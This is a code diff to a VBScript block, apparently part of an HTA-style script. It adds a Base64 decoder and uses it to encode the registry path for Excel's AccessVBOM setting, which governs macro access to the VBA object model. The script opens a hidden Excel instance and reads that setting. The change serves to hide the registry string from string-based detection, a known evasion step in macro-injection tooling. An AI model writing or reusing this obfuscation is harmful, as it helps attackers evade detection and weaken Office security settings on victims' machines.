@@ -4,6 +4,58 @@
 	<script language="vbscript">
 		<![CDATA[
 
+		Function Base64Decode(ByVal roar)
+
+			Const things = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
+			Dim dataLength
+			Dim sOut
+			Dim groupBegin
+
+			roar = Replace(roar, vbCrLf, "")
+			roar = Replace(roar, vbTab, "")
+			roar = Replace(roar, " ", "")
+
+			dataLength = Len(roar)
+			If dataLength Mod 4 <> 0 Then
+				Exit Function
+			End If
+	  
+			For groupBegin = 1 To dataLength Step 4
+				Dim numDataBytes
+				Dim CharCounter
+				Dim thisChar
+				Dim thisData
+				Dim nGroup
+				Dim pOut
+				numDataBytes = 3
+				nGroup = 0
+
+			For CharCounter = 0 To 3
+				thisChar = Mid(roar, groupBegin + CharCounter, 1)
+
+				If thisChar = "=" Then
+					numDataBytes = numDataBytes - 1
+					thisData = 0
+				Else
+					thisData = InStr(1, things, thisChar, vbBinaryCompare) - 1
+				End If
+
+				nGroup = 64 * nGroup + thisData
+			Next
+	    
+				nGroup = Hex(nGroup)
+				nGroup = String(6 - Len(nGroup), "0") & nGroup
+
+				pOut = Chr(CByte("&H" & Mid(nGroup, 1, 2))) + _
+				Chr(CByte("&H" & Mid(nGroup, 3, 2))) + _
+				Chr(CByte("&H" & Mid(nGroup, 5, 2)))
+
+				sOut = sOut & Left(pOut, numDataBytes)
+	  		Next
+
+				Base64Decode = sOut
+		End Function
+
 	Set objExcel = CreateObject("Excel.Application")
 	objExcel.Visible = False
 
@@ -16,7 +68,7 @@
 	end function
 
 	' Get the old AccessVBOM value
-	RegPath = "HKEY_CURRENT_USER\Software\Microsoft\Office" & objExcel.Version & "\Excel\Security\AccessVBOM"
+	RegPath = Base64Decode("SEtFWV9DVVJSRU5UX1VTRVJcU29mdHdhcmVcTWljcm9zb2Z0XE9mZmljZQ==") & objExcel.Version & Base64Decode("XEV4Y2VsXFNlY3VyaXR5XEFjY2Vzc1ZCT00=")
 
 	if RegExists(RegPath) then
 		action = WshShell.RegRead(RegPath)
